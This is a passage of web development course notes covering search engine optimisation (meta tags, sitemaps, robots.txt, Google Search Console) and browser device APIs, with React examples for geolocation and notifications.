You also want to be an authority to yourself. This includes links from other applications that you own, and internal application links. Making sure that you have multiple paths to key content from within your application will help the Google crawler find the content and value its authority.

## Structure and organization

You need to properly use HTML elements to correctly define and organize your application. The Google search crawler is an automated bot. That means it will not spend a lot of effort trying to guess what you meant with the `div` or `span` element, when they actually represent a `title` or `a` element. Leveraging the semantic meaning of HTML will help the crawler navigate your content.

You want to make sure that your content is not hidden behind JavaScript interactions. When the crawler hits a URL, the important content should be rendered. The crawler should not have to interact with the application before the content is injected.

Key HTML elements include the `title` and `heading` elements. The title and heading elements should contain text that clearly defines the value of your content, and include keywords that you want in the search index.

## Metadata

HTML defines several elements and attributes that search crawlers specifically target. This includes the `description`, `robots`, social media open graph (`og`), and image alt attributes.

If you were creating a description for Simon, you would include something like the following description meta element on the home page of your application.

```html
<meta name="description" content="Game play, news, rankings, tips, and instruction for Simon." />
```

The robots meta element instructs the crawler how to specifically index a given page. The image alt attribute tells the crawler the keywords for a given image.

The open graph (`og`) meta tags are used by social media websites to give a preview of your application. Crawlers consider information like this as a reflection that the application is modern and more interesting to users.

```html
<meta property="og:title" content="Play Simon online" />
<meta property="og:description" content="News, rankings, instruction, and competitive online play for Simon." />
<meta property="og:image" content="https://simon.cs260.click/simon.png" />
```

### Sitemap

A sitemap is a textual file that you distribute with your application. It describes the major content pieces of your application and aids in search crawler navigation. If you have a small application then a sitemap is probably not necessary. If you have hundreds, or thousands, of content pages then you definitely want to build a sitemap and submit it to the Google Search Console.

Here is an example of a simple sitemap file with a single entry.

```xml
<?xml version="1.0" encoding="UTF-8"?>
<urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">
  <url>
    <loc>https://simon.cs260.click/news/2022-world-champion.html</loc>
    <lastmod>2023-01-17</lastmod>
  </url>
</urlset>
```

### Robots.txt

The `robots.txt` file tells the crawler what parts of your application is off limits. Here is an example robots.txt file:

```yaml
# cs260.com/robots.txt
# Tell Google not to crawl the game play path,
# because it won't be useful in Google Search results.
User-agent: googlebot
Disallow: /play/
```

To include a robots.txt file for your application you simply create the file with the specific name `robots.txt` and serve it from the root of your domain.

## Performance and usability

In addition to authority, Google wants to rank results by quality. That means it will check how performant your application is and how good the user experience (UX) is. This includes measurements such as the time it takes for the first byte to load, how long it takes to render the page, and how well your application works on mobile devices.

## Tools

### Google search

You want to frequently do a Google search for your application's domain to see how much of it is being indexed. You can do this by querying Google with your domain name prefixed with `site:`. For example, here is the current result for `site:simon.cs260.click`.

![Simon SEO search](seoGoogleSearch.jpg)

This shows that Google is not indexing any pages from the domain. It looks like we have some SEO work to do. Probably some authoritative links will help.

### PageSpeed Insights

PageSpeed Insights is similar to the Chrome browser debugging tool Lighthouse, but it allows you to run it from a webpage. Using a tool like Insights is helpful because performance and usability are key factors in determining your search ranking. The better the rating you get from PageSpeed Insights, the better your search ranking will be.

Here is the result of examining `simon.cs260.click`. This shows that it is performing well, but that it is not optimal for SEO.

![PageSpeed Insights](seoPageSpeedInsights.jpg)

If we dig into the SEO section of the report we see that there is no Robots.txt file and the description meta element is missing.

![PageSpeed Insights SEO](seoPageSpeedInsightsSeo.jpg)

### Google Search Console

The [Google Search Console](https://search.google.com/search-console/about) contains many tools to help you understand how your application is being indexed and why. This includes information about your website's performance, what pages are indexed, your mobile usability, and information about the site's overall user experience.

![Google Search Console](seoGoogleSearchConsole.jpg)

To get started with the Google Search Console, you need to add a DNS `TXT` record to your application's domain DNS information. This is similar to when you added an `A` or `CNAME` record when you first set up your DNS information with the AWS Route 53 service.

![Google Search Console Verify](seoGoogleSearchConsoleVerify.jpg)

Once your ownership of the domain name is verified, the Google Search Console will start tracking statistics for your domain. Check back often to gain insight on how you can improve your search ranking.

# Device APIs

Every year browsers mature and increase the features that they provide. Sometimes these features are exposed as APIs (Application programming interfaces) that allow a web application to interact with the user through browser, operating system, or device features. For example, your application could take advantage of location services that tell you where your user is physically located, or read a user's contacts in order to allow them to share information with their peers. As these APIs become standard across all browsers they enable web applications to behave more and more like historical native device applications.

## Respecting privacy

Most device APIs require the user to consent to your application's use of the API, but as long as your application is providing value and not just trying to invade the user's privacy, that usually isn't a problem. For example, a good use of location services, would be a restaurant finder application that suggests nearby venues. A bad example of using locations services, would be a Sudoku game that sold your home address to advertisers. In some governmental jurisdictions such uses would be considered illegal.

## Location API

📖 **Deeper dive reading**: [MDN Location API](https://developer.mozilla.org/en-US/docs/Web/API/Geolocation_API/Using_the_Geolocation_API)

The location API provides the GPS location of the device. Like the notification API, the user will be prompted for permission to access their location. After permission is granted then the `navigator.geolocation` API will return the user's location.

The following React component will display the user's location once it loads.

```jsx
import React from 'react';

export function Location() {
  const [position, updatePosition] = React.useState({ lat: 0, long: 0 });

  React.useEffect(() => {
    console.log('updating pos');
    navigator.geolocation.getCurrentPosition((p) => {
      updatePosition({ lat: p.coords.latitude, long: p.coords.longitude });
    });
  }, []);

  return (
    <div>
      {position.lat !== 0 && (
        <div>
          <h1>Your location</h1>
          <div>Latitude: {position.lat}</div>
          <div>Longitude: {position.long}</div>
          <div>
            <iframe
              title='map'
              width='600'
              height='300'
              src={`https://www.openstreetmap.org/export/embed.html?bbox=${position.long + 0.001},${
                position.lat + 0.001
              },${position.long - 0.001},${position.lat - 0.001}&amp;layer=mapnik`}
            ></iframe>
          </div>
        </div>
      )}
      {position.lat === 0 && <div>Location unknown</div>}
    </div>
  );
}
```

You can try this out by creating a simple React app and adding a new component file named `location.js` that contains the above code. Then include Location component in the `App.js` file.

```jsx
import { Location } from './location';

function App() {
  return (
    <div className='App'>
      <header className='App-header'>
        <Location></Location>
      </header>
    </div>
  );
}
```

![Location API](locationAPI.jpg)

## Notification API

📖 **Deeper dive reading**: [MDN Notification API](https://developer.mozilla.org/en-US/docs/Web/API/Notifications_API)

As an example of integrating your web application with the device, let's look at the Notification API.

The following React code has a function to register the user's permission to display notifications, and a function to send notifications. The state representing a user's permission is initialized with the Notification API `permission` property. The state of the property can be `default` (not set), `granted`, or `denied`. If a user grants permission then the `Notification` class may be used to actually display a notification.

The rest of the code controls the UI for the display state, buttons, and message input.

```jsx
function Notifier() {
  const [acceptanceState, updateAcceptanceState] = React.useState(Notification.permission);
  const [msg, updateMsg] = React.useState('');

  function register() {
    Notification.requestPermission().then((response) => {
      updateAcceptanceState(response);
    });
  }

  function notify() {
    new Notification('You are notified', {
      body: msg,
    });
    updateMsg('');
  }

  return (
    <div className='component'>
      <p>User's acceptance of notifications: {acceptanceState}</p>
      {acceptanceState === 'default' && <button onClick={() => register()}>Register</button>}
      {acceptanceState === 'granted' && (
        <div>
          <input type='text' value={msg} onChange={(e) => updateMsg(e.target.value)} placeholder='msg here'></input>
          <button disabled={msg === ''} onClick={() => notify()}>
            Notify
          </button>
        </div>
      )}
    </div>
  );
}
```

Here is what the code looks like in action.

![Notification Example](notificationApi.gif)

## Other APIs

Other interesting device APIs include the [Contact Picker](https://developer.mozilla.org/en-US/docs/Web/API/Contact_Picker_API), [Bluetooth](https://developer.mozilla.org/en-US/docs/Web/API/Bluetooth/requestDevice), and [File System](https://developer.mozilla.org/en-US/docs/Web/API/File_System_Access_API).

Before you get too excited about using any device API make sure you check the current browser support for the API so that you can make sure you properly serve your target market. If a specific device is not supported on some device or browser, you can always hide that functionality for those users while still providing it for others.
